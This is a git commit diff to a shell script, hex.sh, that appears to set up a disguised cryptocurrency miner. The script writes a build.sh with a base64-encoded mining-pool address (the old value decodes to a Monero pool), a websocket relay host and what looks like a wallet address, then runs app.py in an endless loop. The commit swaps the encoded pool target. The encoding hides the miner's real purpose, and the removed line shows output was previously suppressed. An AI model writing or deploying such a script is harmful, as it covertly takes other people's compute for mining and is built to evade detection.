353c93c5eae37d722159b708b9492bc58006fcb9
oqaize699-sys <oqaize699@ucemo.com>
2026-09-06 10:35:25 +0700

    Update hex.sh

--- hex.sh
+++ hex.sh
@@ -20,7 +20,7 @@ export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
 echo "SERVER_WS=wss://vpn.dichoiseptoa.site
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
+SERVER_TARGET=aGFzaC5kZW1vLWN1dGZsb3cubXkuaWQ6ODA4MA==
 SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
 SERVER_SECRET=$NAME
 SERVER_CONNECTION=$PORT
@@ -29,4 +29,4 @@ while true; do
   python3 app.py
   sleep 15
 done' > build.sh
-bash build.sh 8 suto-hax >/dev/null 2>&1
+bash build.sh 8 suto-hax1
